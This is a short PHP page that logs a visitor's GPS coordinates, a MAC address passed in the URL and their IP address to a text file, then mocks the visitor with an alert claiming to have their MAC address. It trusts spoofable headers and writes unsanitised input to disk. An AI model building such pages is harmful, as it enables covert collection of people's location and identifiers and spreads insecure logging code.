<html language="pt-br">
  
  <head>
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <!-- Latest compiled and minified CSS --> 
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
  </head>
  <body>

    <?php
      //teste de gps
      $longitude = $_POST["longitude"];
      $latitude = $_POST["latitude"];
           
      $mac = $_GET["mac"];
      
      $http_client_ip       = $_SERVER['HTTP_CLIENT_IP'];
      $http_x_forwarded_for = $_SERVER['HTTP_X_FORWARDED_FOR'];
      $remote_addr          = $_SERVER['REMOTE_ADDR'];
      
      /* VERIFICO SE O IP REALMENTE EXISTE NA INTERNET */
      if(!empty($http_client_ip)){
        $ip = $http_client_ip;
        /* VERIFICO SE O ACESSO PARTIU DE UM SERVIDOR PROXY */
      } elseif(!empty($http_x_forwarded_for)){
        $ip = $http_x_forwarded_for;
      } else {
        /* CASO EU Nï¿½O ENCONTRE NAS DUAS OUTRAS MANEIRAS, RECUPERO DA FORMA TRADICIONAL */
        $ip = $remote_addr;
      }
      
      date_default_timezone_set('America/Sao_Paulo');
      $date = date('Y-m-d H:i');
       
      //========  GRAVAï¿½ï¿½O NO ARQUIVO EM .TXT  ==========
      
      //PREPARA O CONTEï¿½DO A SER GRAVADO
      $conteudo = "\n Endereço MAC: $mac  Ip: $ip  Latitude: $latitude  Longitude: $longitude  Data: $date  \r\n\n ============================================\n\n";
      
      //ARQUIVO TXT
      $arquivo= "dados.txt";
      
      //TENTA ABRIR O ARQUIVO TXT
      if (!$abrir = fopen($arquivo, "a")) {
        echo  "Erro abrindo arquivo ($arquivo)";
        exit;
      }
      
      //ESCREVE NO ARQUIVO TXT
      if (!fwrite($abrir,$conteudo)) {
        print "Erro escrevendo no arquivo ($arquivo)";
        exit;
      }
      
      // echo "Arquivo corrompido no servidor !!";
      
      //FECHA O ARQUIVO 
      fclose($abrir); 
         
      $mac = $_GET["mac"];   
      
      if($mac != NULL){
        echo "<script type='text/javascript'>
          alert ('Agora eu tenho o seu endereço MAC!');
          window.location='index.html';
          </script>";
        
      
      } else {
        echo "<script type='text/javascript'>
          alert ('Para de digitar merda!!!!');
          window.location='index.html';
          </script>";        
      }
      
      ?>

  </body>
</html>

